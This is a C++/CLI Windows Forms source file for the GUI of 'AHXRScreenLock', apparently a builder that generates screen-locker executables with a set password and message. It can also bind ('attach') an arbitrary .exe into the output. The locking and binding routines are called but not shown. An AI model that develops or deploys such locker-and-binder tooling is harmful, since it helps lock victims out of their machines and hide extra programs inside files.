/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=========================================
#pragma once

namespace AHXRScreenLock {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmMain
	/// </summary>
	public ref class frmMain : public System::Windows::Forms::Form
	{
	public:
		frmMain(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmMain()
		{
			if (components)
			{
				delete components;
			}
		}

	protected:



	private: System::Windows::Forms::TextBox^  txtMessage;
	private: System::Windows::Forms::Button^  btnBuild;
	private: System::Windows::Forms::SaveFileDialog^  saveFileDialog;
	private: System::Windows::Forms::ProgressBar^  pgBar;
	private: System::Windows::Forms::OpenFileDialog^  attachDialog;
	private: System::Windows::Forms::Button^  btnAttach;
	private: System::Windows::Forms::Panel^  panel1;
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::Label^  label2;
	private: System::Windows::Forms::CheckBox^  chkMask;
	private: System::Windows::Forms::TextBox^  txtPassword;
	private: System::Windows::Forms::Panel^  panel2;
	private: System::Windows::Forms::Label^  label3;
	private: System::Windows::Forms::Label^  label4;
	private: System::Windows::Forms::TextBox^  txtExe;
	private: System::Windows::Forms::Panel^  panel3;
	private: System::Windows::Forms::Label^  lblExample;
	private: bool b_dragging;
	private: Point p_offset;


	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->txtMessage = (gcnew System::Windows::Forms::TextBox());
			this->btnBuild = (gcnew System::Windows::Forms::Button());
			this->saveFileDialog = (gcnew System::Windows::Forms::SaveFileDialog());
			this->pgBar = (gcnew System::Windows::Forms::ProgressBar());
			this->attachDialog = (gcnew System::Windows::Forms::OpenFileDialog());
			this->btnAttach = (gcnew System::Windows::Forms::Button());
			this->panel1 = (gcnew System::Windows::Forms::Panel());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->chkMask = (gcnew System::Windows::Forms::CheckBox());
			this->txtPassword = (gcnew System::Windows::Forms::TextBox());
			this->panel2 = (gcnew System::Windows::Forms::Panel());
			this->label3 = (gcnew System::Windows::Forms::Label());
			this->label4 = (gcnew System::Windows::Forms::Label());
			this->txtExe = (gcnew System::Windows::Forms::TextBox());
			this->panel3 = (gcnew System::Windows::Forms::Panel());
			this->lblExample = (gcnew System::Windows::Forms::Label());
			this->panel1->SuspendLayout();
			this->panel3->SuspendLayout();
			this->SuspendLayout();
			// 
			// txtMessage
			// 
			this->txtMessage->Location = System::Drawing::Point(13, 104);
			this->txtMessage->MaxLength = 20;
			this->txtMessage->Multiline = true;
			this->txtMessage->Name = L"txtMessage";
			this->txtMessage->Size = System::Drawing::Size(220, 22);
			this->txtMessage->TabIndex = 3;
			this->txtMessage->TextChanged += gcnew System::EventHandler(this, &frmMain::txtMessage_TextChanged);
			// 
			// btnBuild
			// 
			this->btnBuild->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->btnBuild->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnBuild->Location = System::Drawing::Point(11, 363);
			this->btnBuild->Name = L"btnBuild";
			this->btnBuild->Size = System::Drawing::Size(135, 42);
			this->btnBuild->TabIndex = 2;
			this->btnBuild->Text = L"Build";
			this->btnBuild->UseVisualStyleBackColor = true;
			this->btnBuild->Click += gcnew System::EventHandler(this, &frmMain::btnBuild_Click);
			// 
			// saveFileDialog
			// 
			this->saveFileDialog->Filter = L"EXE Files|*.exe";
			this->saveFileDialog->Title = L"File Name";
			this->saveFileDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::saveFileDialog_FileOk);
			// 
			// pgBar
			// 
			this->pgBar->Location = System::Drawing::Point(152, 363);
			this->pgBar->Name = L"pgBar";
			this->pgBar->Size = System::Drawing::Size(298, 42);
			this->pgBar->TabIndex = 3;
			// 
			// attachDialog
			// 
			this->attachDialog->FileName = L"openFileDialog1";
			this->attachDialog->Filter = L"exe files|*.exe";
			this->attachDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::attachDialog_FileOk);
			// 
			// btnAttach
			// 
			this->btnAttach->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->btnAttach->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnAttach->Location = System::Drawing::Point(315, 60);
			this->btnAttach->Name = L"btnAttach";
			this->btnAttach->Size = System::Drawing::Size(79, 43);
			this->btnAttach->TabIndex = 4;
			this->btnAttach->Text = L"ATTACH";
			this->btnAttach->UseVisualStyleBackColor = true;
			this->btnAttach->Click += gcnew System::EventHandler(this, &frmMain::btnAttach_Click);
			// 
			// panel1
			// 
			this->panel1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(20)), static_cast<System::Int32>(static_cast<System::Byte>(20)),
				static_cast<System::Int32>(static_cast<System::Byte>(20)));
			this->panel1->Controls->Add(this->label1);
			this->panel1->Location = System::Drawing::Point(-9, -30);
			this->panel1->Name = L"panel1";
			this->panel1->Size = System::Drawing::Size(491, 62);
			this->panel1->TabIndex = 5;
			this->panel1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseDown);
			this->panel1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseMove);
			this->panel1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseUp);
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label1->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label1->Location = System::Drawing::Point(16, 35);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(280, 22);
			this->label1->TabIndex = 0;
			this->label1->Text = L"AHXRScreenLock - ScreenLock Builder";
			this->label1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseDown);
			this->label1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseMove);
			this->label1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseUp);
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label2->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label2->Location = System::Drawing::Point(12, 39);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(164, 18);
			this->label2->TabIndex = 8;
			this->label2->Text = L"PASSWORD (16 CHARACTERS)";
			// 
			// chkMask
			// 
			this->chkMask->AutoSize = true;
			this->chkMask->Checked = true;
			this->chkMask->CheckState = System::Windows::Forms::CheckState::Checked;
			this->chkMask->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->chkMask->ForeColor = System::Drawing::Color::DodgerBlue;
			this->chkMask->Location = System::Drawing::Point(182, 38);
			this->chkMask->Name = L"chkMask";
			this->chkMask->Size = System::Drawing::Size(51, 22);
			this->chkMask->TabIndex = 7;
			this->chkMask->Text = L"Mask";
			this->chkMask->UseVisualStyleBackColor = true;
			this->chkMask->CheckedChanged += gcnew System::EventHandler(this, &frmMain::chkMask_CheckedChanged_1);
			// 
			// txtPassword
			// 
			this->txtPassword->Location = System::Drawing::Point(15, 60);
			this->txtPassword->MaxLength = 16;
			this->txtPassword->Name = L"txtPassword";
			this->txtPassword->Size = System::Drawing::Size(218, 20);
			this->txtPassword->TabIndex = 6;
			this->txtPassword->UseSystemPasswordChar = true;
			// 
			// panel2
			// 
			this->panel2->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(10)), static_cast<System::Int32>(static_cast<System::Byte>(10)),
				static_cast<System::Int32>(static_cast<System::Byte>(10)));
			this->panel2->Location = System::Drawing::Point(-17, 26);
			this->panel2->Name = L"panel2";
			this->panel2->Size = System::Drawing::Size(507, 10);
			this->panel2->TabIndex = 9;
			// 
			// label3
			// 
			this->label3->AutoSize = true;
			this->label3->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label3->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label3->Location = System::Drawing::Point(12, 83);
			this->label3->Name = L"label3";
			this->label3->Size = System::Drawing::Size(154, 18);
			this->label3->TabIndex = 10;
			this->label3->Text = L"MESSAGE (20 CHARACTERS)";
			// 
			// label4
			// 
			this->label4->AutoSize = true;
			this->label4->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label4->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label4->Location = System::Drawing::Point(304, 39);
			this->label4->Name = L"label4";
			this->label4->Size = System::Drawing::Size(103, 18);
			this->label4->TabIndex = 11;
			this->label4->Text = L"ATTACH .EXE FILE";
			// 
			// txtExe
			// 
			this->txtExe->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->txtExe->ForeColor = System::Drawing::Color::DodgerBlue;
			this->txtExe->Location = System::Drawing::Point(259, 104);
			this->txtExe->Multiline = true;
			this->txtExe->Name = L"txtExe";
			this->txtExe->ReadOnly = true;
			this->txtExe->ScrollBars = System::Windows::Forms::ScrollBars::Horizontal;
			this->txtExe->Size = System::Drawing::Size(191, 22);
			this->txtExe->TabIndex = 12;
			this->txtExe->Text = L"NO EXECUTABLE ATTACHED";
			this->txtExe->TextAlign = System::Windows::Forms::HorizontalAlignment::Center;
			// 
			// panel3
			// 
			this->panel3->BackColor = System::Drawing::Color::Black;
			this->panel3->Controls->Add(this->lblExample);
			this->panel3->Location = System::Drawing::Point(13, 132);
			this->panel3->Name = L"panel3";
			this->panel3->Size = System::Drawing::Size(437, 225);
			this->panel3->TabIndex = 13;
			// 
			// lblExample
			// 
			this->lblExample->AutoSize = true;
			this->lblExample->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lblExample->ForeColor = System::Drawing::Color::White;
			this->lblExample->Location = System::Drawing::Point(157, 95);
			this->lblExample->Name = L"lblExample";
			this->lblExample->Size = System::Drawing::Size(0, 18);
			this->lblExample->TabIndex = 0;
			// 
			// frmMain
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(35)), static_cast<System::Int32>(static_cast<System::Byte>(35)),
				static_cast<System::Int32>(static_cast<System::Byte>(35)));
			this->ClientSize = System::Drawing::Size(463, 418);
			this->Controls->Add(this->panel3);
			this->Controls->Add(this->txtExe);
			this->Controls->Add(this->label4);
			this->Controls->Add(this->txtMessage);
			this->Controls->Add(this->label3);
			this->Controls->Add(this->panel1);
			this->Controls->Add(this->panel2);
			this->Controls->Add(this->label2);
			this->Controls->Add(this->chkMask);
			this->Controls->Add(this->txtPassword);
			this->Controls->Add(this->btnAttach);
			this->Controls->Add(this->pgBar);
			this->Controls->Add(this->btnBuild);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->MaximizeBox = false;
			this->Name = L"frmMain";
			this->Text = L"AXHRScreenLock";
			this->panel1->ResumeLayout(false);
			this->panel1->PerformLayout();
			this->panel3->ResumeLayout(false);
			this->panel3->PerformLayout();
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void btnBuild_Click(System::Object^  sender, System::EventArgs^  e) {

		std::string
			s_msg = marshal_as< std::string >(this->txtMessage->Text),
			s_pw = marshal_as< std::string >(this->txtPassword->Text);

		bool
			b_check;

		if (s_msg.find("----") != std::string::npos || s_msg.find("{") != std::string::npos || s_msg.find("}") != std::string::npos) {
			MessageBox::Show("Illegal characters.");
			b_check = true;
		}
		if (s_msg.length() <= 0) {
			MessageBox::Show("Please enter a message.");
			b_check = true;
		}
		if (s_pw.length() <= 0) {
			MessageBox::Show("Please enter a password.");
			b_check = true;
		}

		if(!b_check)
			this->saveFileDialog->ShowDialog();
	}
	private: System::Void saveFileDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {

		std::string
			s_file = marshal_as< std::string >(this->saveFileDialog->FileName);

		this->pgBar->Value = 25;
		buildNewLocker(s_file);
		this->pgBar->Value = 65;
		packLocker(s_file, marshal_as< std::string >(this->txtPassword->Text), marshal_as< std::string >(this->txtMessage->Text));
		this->pgBar->Value = 80;
		if ( !s_attached_p.empty() ) {
			attachExecutable(s_file, s_attached_p);
		}

		this->pgBar->Value = 100;

		MessageBox::Show("Done");
	}
private: System::Void btnAttach_Click(System::Object^  sender, System::EventArgs^  e) {
	this->attachDialog->ShowDialog();
}
private: System::Void attachDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {
	s_attached_p = marshal_as< std::string >(this->attachDialog->FileName);
	this->txtExe->Text = this->attachDialog->FileName->Substring(this->attachDialog->FileName->LastIndexOf(L"\\")+1);
}
private: System::Void txtMessage_TextChanged(System::Object^  sender, System::EventArgs^  e) {
	this->lblExample->Text = this->txtMessage->Text;
}
private: System::Void chkMask_CheckedChanged_1(System::Object^  sender, System::EventArgs^  e) {
	this->txtPassword->UseSystemPasswordChar = this->chkMask->Checked;
}
private: System::Void panel1_MouseDown(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->b_dragging = true;
	this->p_offset = Point(e->X, e->Y);
}
private: System::Void panel1_MouseMove(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	if (this->b_dragging) {
		Point p_current = PointToScreen(e->Location);
		Location = Point(p_current.X - this->p_offset.X, p_current.Y - this->p_offset.Y);
	}
}
private: System::Void panel1_MouseUp(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->b_dragging = false;
}
};
}
